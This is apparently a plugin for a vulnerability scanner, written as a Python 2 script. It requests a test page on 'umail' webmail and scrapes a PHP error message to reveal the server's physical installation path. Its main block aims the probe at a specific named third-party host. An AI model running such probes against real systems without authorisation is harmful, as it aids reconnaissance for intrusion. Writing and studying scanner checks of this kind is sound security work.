#!/usr/bin/env python
import re,time

def assign(service, arg):
    if service == "umail":
        return True, arg

def get_path(arg):
    try:
        url = arg + '/webmail/client/mail/module/test.php'
        code, head, res, errcode, _ = curl.curl2(url)
        temp=re.search(r'a non-object in <b>(.*)\\client\\mail',res,re.S).group(1)
        temp=temp.split('\\')
        path=''
        for i in range(len(temp)):
            t=temp[i]+'/'
            path+=t
        return path
    except Exception, e:
        return False



def audit(arg):

    path = get_path(arg)
    if path != False:
        security_info('Physical path:%s'%path)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://oa.shindoo.com:810/')[1])